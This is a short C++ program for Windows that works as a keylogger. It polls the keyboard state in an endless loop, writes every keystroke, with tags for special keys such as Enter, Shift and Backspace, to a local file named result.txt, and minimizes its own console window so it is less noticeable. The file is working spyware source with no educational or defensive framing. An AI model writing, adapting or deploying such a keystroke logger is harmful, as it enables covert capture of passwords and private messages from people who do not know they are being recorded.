#include <iostream>
#include <fstream>
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
using namespace std;
/*Helper method to save special keys */
void save(string key) {
    ofstream log;
    log.open("result.txt", fstream::app);
    if (log.is_open()) {
		log << key;
		log.close();
	} 
}
/*Cases for key other than alphabet i,e special letters*/
bool key(int press) {
	switch (press) {
	default: 
		return false;

	case VK_RETURN:
		save("/enter/");
		return true;
	case VK_SHIFT:
		save("/shift/");
		return true;
	case VK_BACK:
		save("/backspace/");
		return true;
    case VK_SPACE:
		save("/spacebar/");
		return true;   
	case VK_RBUTTON:
		save("");
    case VK_LBUTTON:
		save("");
		return true;
	case VK_CAPITAL:
		save("/caps/");
		return true;
	case VK_TAB:
		save("/tab/");
		return true;
	case VK_UP:
		save("/arrowup/");
		return true;
	case VK_DOWN:
	    save("/down/");
		return true;
	case VK_LEFT:
		save("/leftarrow/");
		return true;
	case VK_RIGHT:
		save("/rightarrow/");
		return true;
	case VK_CONTROL:
		save("/controlkey/");
		return true;
	case VK_MENU:
		save("/altkey/");
		return true;
	
	}
}
/*Method that saves normal key input*/
void normalKey(){
	//variable that stores the key
    char i;
	//outputstream that stores all the key pressed
    fstream record;
    while (true) {
        for (i = 8; i < 190; i++) {
            //if non special button is pressed
            if(GetAsyncKeyState(i)== -32767 && key(i)==false){
                record.open("result.txt", fstream::app);
                if(record.is_open()) {
                    record << (char)(i);   
                    record.close();
                }
             }
        }
    }
}
//method to minimize window console screen
void hide(){
	::ShowWindow(::GetConsoleWindow(), SW_MINIMIZE);
}
int main () {
	hide();
	normalKey();
    return 0;
}
